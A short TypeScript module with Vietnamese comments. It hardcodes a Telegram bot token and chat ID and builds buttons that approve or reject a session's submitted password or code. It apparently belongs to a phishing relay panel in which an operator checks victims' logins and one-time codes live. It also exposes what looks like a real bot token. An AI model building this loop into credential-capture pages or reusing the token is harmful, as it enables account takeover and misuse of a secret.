// Token bot — lấy từ @BotFather sau khi tạo bot
const TOKEN = '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA';

// Chat ID — lấy từ https://api.telegram.org/bot<TOKEN>/getUpdates
const CHAT_ID = '7211586401';

export { CHAT_ID, TOKEN };

export type ApprovalType = 'password' | 'code';

export function buildApprovalKeyboard(type: ApprovalType, sessionId: string) {
    return {
        inline_keyboard: [
            [
                { text: '✅ Duyệt — đúng', callback_data: `approve:${type}:${sessionId}` },
                { text: '❌ Sai — thử lại', callback_data: `reject:${type}:${sessionId}` }
            ]
        ]
    };
}

export async function telegramRequest<T = unknown>(method: string, body: Record<string, unknown>): Promise<T> {
    const url = `https://api.telegram.org/bot${TOKEN}/${method}`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    return response.json() as Promise<T>;
}
